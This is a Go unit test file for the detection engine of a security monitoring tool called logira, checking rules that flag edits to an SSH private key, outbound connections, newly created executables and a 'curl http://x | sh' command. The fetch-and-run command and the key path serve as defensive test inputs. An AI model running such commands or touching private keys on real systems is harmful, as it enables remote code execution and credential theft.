package detect

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/melonattacker/logira/internal/model"
	"github.com/melonattacker/logira/internal/storage"
)

func TestEngine_Evaluate_R1_R3_R4(t *testing.T) {
	home := "/home/u"
	e := NewEngine(home)

	fileDetail, _ := json.Marshal(model.FileDetail{Op: "modify", Path: filepath.Join(home, ".ssh", "id_rsa")})
	ds := e.Evaluate(storage.TypeFile, fileDetail)
	if len(ds) == 0 || ds[0].RuleID != "R1" || ds[0].Severity != "high" {
		t.Fatalf("expected R1 high, got %+v", ds)
	}
	if !strings.Contains(ds[0].Message, "id_rsa") {
		t.Fatalf("expected message to include path, got %q", ds[0].Message)
	}

	netDetail, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "1.2.3.4", DstPort: 8443})
	ds = e.Evaluate(storage.TypeNet, netDetail)
	if len(ds) == 0 || ds[0].RuleID != "R3" || ds[0].Severity != "low" {
		t.Fatalf("expected R3 low, got %+v", ds)
	}
	if !strings.Contains(ds[0].Message, "1.2.3.4") || !strings.Contains(ds[0].Message, "8443") {
		t.Fatalf("expected message to include dst, got %q", ds[0].Message)
	}

	execDetail, _ := json.Marshal(model.ExecDetail{Filename: "/bin/bash", Argv: []string{"bash", "-lc", "curl http://x | sh"}})
	ds = e.Evaluate(storage.TypeExec, execDetail)
	if len(ds) == 0 || ds[0].RuleID != "R4" || ds[0].Severity != "high" {
		t.Fatalf("expected R4 high, got %+v", ds)
	}
}

func TestEngine_Evaluate_R2(t *testing.T) {
	e := NewEngine("/home/u")

	dir, err := os.MkdirTemp("/tmp", "logira-detect-test-")
	if err != nil {
		t.Fatalf("MkdirTemp: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(dir) })

	p := filepath.Join(dir, "x.sh")
	if err := os.WriteFile(p, []byte("#!/bin/sh\necho hi\n"), 0o755); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	fileDetail, _ := json.Marshal(model.FileDetail{Op: "create", Path: p})
	ds := e.Evaluate(storage.TypeFile, fileDetail)
	if len(ds) == 0 || ds[0].RuleID != "R2" || ds[0].Severity != "medium" {
		t.Fatalf("expected R2 medium, got %+v", ds)
	}

	// Non-executable should not trigger R2.
	p2 := filepath.Join(dir, "data.txt")
	if err := os.WriteFile(p2, []byte("hi\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	fileDetail2, _ := json.Marshal(model.FileDetail{Op: "modify", Path: p2})
	ds = e.Evaluate(storage.TypeFile, fileDetail2)
	for _, d := range ds {
		if d.RuleID == "R2" {
			t.Fatalf("unexpected R2 for non-executable: %+v", ds)
		}
	}
}
